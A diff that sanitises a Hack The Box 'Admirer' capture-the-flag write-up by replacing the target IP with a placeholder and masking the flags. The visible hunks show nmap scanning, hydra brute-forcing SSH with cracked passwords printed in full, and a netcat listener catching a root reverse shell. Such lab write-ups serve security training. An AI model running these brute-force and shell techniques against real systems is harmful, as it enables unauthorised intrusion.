@@ -11,20 +11,18 @@ htb_url: https://app.hackthebox.com/machines/Admirer
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-admirer-infocard.png)
-
 An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability.  It also has an interesting new \(to me\) way to leverage sudo privileges to gain privilege escalation.  In all, this was a fun machine that taught me some interesting new tricks!
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.187`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kali:~/htb/admirer$ nmap -p- -sCV -oA admirer 10.10.10.187
+zweilos@kali:~/htb/admirer$ nmap -p- -sCV -oA admirer <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 14:20 EDT
-Nmap scan report for 10.10.10.187
+Nmap scan report for <YOUR_IP>
 Host is up (0.057s latency).
 Not shown: 65532 closed ports
 PORT   STATE SERVICE VERSION
@@ -47,10 +45,10 @@ Nmap done: 1 IP address (1 host up) scanned in 51.54 seconds
 Looking at the results of my nmap scan I saw that only ports 21 \(FTP\), 22 \(SSH\), and 80 \(HTTP\) were open.  
 
 ```text
-zweilos@kali:~/htb/admirer$ ftp 10.10.10.187                                                      
-Connected to 10.10.10.187.                                                                           
+zweilos@kali:~/htb/admirer$ ftp <YOUR_IP>                                                      
+Connected to <YOUR_IP>.                                                                           
 220 (vsFTPd 3.0.3)                                                                                   
-Name (10.10.10.187:zweilos): anonymous                                                               
+Name (<YOUR_IP>:zweilos): anonymous                                                               
 530 Permission denied.                                                                               
 Login failed.
 ```
@@ -123,14 +121,14 @@ w0rdpr3ss01!
 Next I used `hydra` to attempt a brute-force attack against SSH to see if any of the credentials would allow me to log in.
 
 ```text
-zweilos@kali:~/htb/admirer$ hydra -L users -P passwords 10.10.10.187 ssh
+zweilos@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 15:40:32
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:10/p:3), ~2 tries per task
-[DATA] attacking ssh://10.10.10.187:22/
-[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
+[DATA] attacking ssh://<YOUR_IP>:22/
+[22][ssh] host: <YOUR_IP>   login: ftpuser   password: %n?4Wz}R$tTF7
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 15:40:38
 ```
@@ -138,10 +136,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 15:40:
 The FTP credentials seemed to also work for SSH! However, the connection was closed immediately upon logging in.  After trying various ways to bypass this and failing, I moved on to try the credentials for FTP instead.
 
 ```text
-zweilos@kali:~/htb/admirer$ ftp 10.10.10.187
-Connected to 10.10.10.187.
+zweilos@kali:~/htb/admirer$ ftp <YOUR_IP>
+Connected to <YOUR_IP>.
 220 (vsFTPd 3.0.3)
-Name (10.10.10.187:zweilos): ftpuser
+Name (<YOUR_IP>:zweilos): ftpuser
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -220,7 +218,7 @@ The `credentials.txt` had most of the same information as before, but `waldo` se
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-admin-tasks.png)
 
-I navigated to `http://10.10.10.187/utility-scripts/admin_tasks.php` which brought me to a website for running administrative tasks on the server.  
+I navigated to `http://<YOUR_IP>/utility-scripts/admin_tasks.php` which brought me to a website for running administrative tasks on the server.  
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.9-admin-tasks.png)
 
@@ -344,15 +342,15 @@ I wasn't even sure that this was going to work, but to my surprise it retrieved 
 Much to my surprise...there was yet again another password contained in this file. Before trying to download any more files I decided to try to brute force SSH login again with this new password.
 
 ```text
-zweilos@kali:~/htb/admirer$ hydra -L users -P passwords 10.10.10.187 ssh
+zweilos@kali:~/htb/admirer$ hydra -L users -P passwords <YOUR_IP> ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 22:49:46
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:11/p:7), ~5 tries per task
-[DATA] attacking ssh://10.10.10.187:22/
-[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
-[22][ssh] host: 10.10.10.187   login: waldo   password: &<h5b~yK3F#{PaPB&dA}{H>
+[DATA] attacking ssh://<YOUR_IP>:22/
+[22][ssh] host: <YOUR_IP>   login: ftpuser   password: %n?4Wz}R$tTF7
+[22][ssh] host: <YOUR_IP>   login: waldo   password: &<h5b~yK3F#{PaPB&dA}{H>
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 22:50:00
 ```
@@ -362,8 +360,8 @@ I had finally found a usable password for `waldo`!  I hoped that it wouldn't jus
 ### User.txt
 
 ```text
-zweilos@kali:~/htb/admirer$ ssh waldo@10.10.10.187
-waldo@10.10.10.187's password: 
+zweilos@kali:~/htb/admirer$ ssh waldo@<YOUR_IP>
+waldo@<YOUR_IP>'s password: 
 Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
 
 The programs included with the Devuan GNU/Linux system are free software;
@@ -378,7 +376,7 @@ Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
 waldo@admirer:~$ ls
 user.txt
 waldo@admirer:~$ cat user.txt
-e9d47e5a8ef5972c07c9a8adb1a2af9a
+****
 ```
 
 Luckily it logged me right in, and I was able to collect my hard-earned loot!
@@ -481,8 +479,6 @@ backup_db()
     fi
 }
 
-
-
 # Non-interactive way, to be used by the web interface
 if [ $# -eq 1 ]
 then
@@ -501,7 +497,6 @@ then
 
     exit 0
 fi
-
 
 # Interactive way, to be called from the command line
 options=("View system uptime"
@@ -738,13 +733,9 @@ waldo@admirer:/dev/shm$ I am groot
 ```text
 zweilos@kali:~$ nc -lvnp 12345
 listening on [any] 12345 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.187] 60956
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 60956
 whoami
 root
 cat /root/root.txt
-0f4b44fb50b2c25de7e1464a2ea8b877
+****
 ```
-
-Thanks to [`polarbearer`](https://www.hackthebox.eu/home/users/profile/159204) and [`GibParadox`](https://www.hackthebox.eu/home/users/profile/125033) for creating this fun and interesting machine that taught me some new ways to take advantage of some common vulnerabilities and misconfigurations.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
